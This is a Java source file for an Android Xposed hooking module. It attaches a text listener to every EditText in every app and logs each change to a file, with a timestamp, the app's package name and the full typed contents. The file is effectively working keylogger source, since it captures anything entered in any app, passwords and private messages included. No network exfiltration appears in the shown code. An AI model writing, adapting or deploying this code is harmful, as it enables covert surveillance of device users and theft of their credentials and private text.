package an.input.hook;

import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import java.util.Date;

import static an.input.hook.Utils.writeToFile;

public class TextWatcherHook
{
 TextChangeHook tch = new TextChangeHook();
 
 public void hook(LoadPackageParam p1)
 {
  tch.setTextWatcher(new MyTextWatcher(p1.packageName));
  XposedBridge.hookAllConstructors(XposedHelpers.findClass(EditText.class.getName(),p1.classLoader),tch);
 }
 
 class TextChangeHook extends XC_MethodHook
 {
  MyTextWatcher mtw;
  
  public void setTextWatcher(MyTextWatcher mtw)
  {
   this.mtw = mtw;
  }
  
  protected void afterHookedMethod(MethodHookParam param) throws Throwable
  {
   if(param.thisObject instanceof EditText)
   ((EditText)param.thisObject).addTextChangedListener(mtw);
  }
 }
 
 class MyTextWatcher implements TextWatcher
 {
  String packageName;
  
  public MyTextWatcher(String pName)
  {
   packageName = pName;
  }
  
  @Override
  public void beforeTextChanged(CharSequence p1, int p2, int p3, int p4)
  {}

  @Override
  public void onTextChanged(CharSequence p1, int p2, int p3, int p4)
  {}

  @Override
  public void afterTextChanged(Editable p1)
  {
   writeToFile(new Date().toLocaleString().split(" ")[1]
               + ", 包:" + packageName
               + ", 内容:" + p1.toString());
  }
 }
 
}
